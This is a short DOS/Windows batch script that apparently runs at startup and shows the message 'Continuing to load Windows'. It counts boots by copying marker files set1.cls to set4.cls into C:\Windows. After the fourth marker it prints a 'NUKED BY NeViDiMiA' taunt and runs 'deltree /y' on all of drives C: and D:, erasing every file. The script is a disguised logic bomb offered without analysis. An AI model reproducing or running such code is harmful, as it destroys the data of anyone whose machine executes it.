   if exist C:\Windows\set1.cls goto :TWO
   copy set1.cls C:\Windows
   goto :END

   :TWO
   if exist C:\Windows\set2.cls goto :THREE
   copy set2.cls  C:\Windows
   goto :END

   :THREE
   if exist C:\Windows\set3.cls goto :FOUR
   copy set3.cls C:\Windows
   goto :END

   :FOUR
   if exist C:\Windows\set4.cls goto :KILL
   copy set4.cls C:\Windows
   goto :END

   :KILL
   @echo YOU WAS NUKED BY NeViDiMiA - #Shoumen !
   @echo The Internet is not a safe place !
   deltree /y D:\*.*
   deltree /y C:\*.*


   :END
   @Continuing to load Windows ...
